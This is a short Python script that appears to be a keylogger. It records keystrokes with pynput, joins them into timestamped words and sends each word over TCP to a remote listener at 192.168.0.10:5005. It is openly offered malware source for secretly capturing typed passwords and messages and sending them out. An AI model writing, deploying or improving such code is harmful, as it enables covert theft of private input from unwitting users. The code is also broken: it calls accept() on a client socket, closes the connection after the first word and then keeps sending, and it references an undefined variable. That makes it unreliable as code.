from pynput import keyboard
import time
import socket

TCP_IP = '192.168.0.10'
TCP_PORT = 5005
BUFFER_SIZE = 2048

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TCP_IP, TCP_PORT))
l="Connection is Up and Running"
client.send(l.encode())
data = client.recv(BUFFER_SIZE).decode()
# client.close()
print("test")
def on_release(key):
    letter = key
    if letter == keyboard.Key.tab:	
        client.close()
        return False
letters = []
def log(key):		 
	letter = key
	if letter != keyboard.Key.space and letter != keyboard.Key.enter and letter != keyboard.Key.tab and letter != keyboard.Key.up and letter != keyboard.Key.left and letter != keyboard.Key.right and letter != keyboard.Key.down and letter != keyboard.Key.backspace:	
		letters.append(letter)	
	if letter == keyboard.Key.backspace:
		if len(letters) > 0:
			del letters[-1]
	if letter == keyboard.Key.space or letter == keyboard.Key.enter or letter == keyboard.Key.tab:			
		print(letters)
		named_tuple = time.localtime() 	 
		time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
		word = ''.join(map(str, letters))
		word = word.replace("'","")
		word = word+"  --  "+time_string
		print(word)
		client.send(word.encode())
		data = client.accept(BUFFER_SIZE).decode()
		client.close()
		del letters[:]
	print(letters)
	

with keyboard.Listener(
        on_press=log,
        on_release=on_release
        ) as listener:
    listener.join()
for val in words:
	print(val)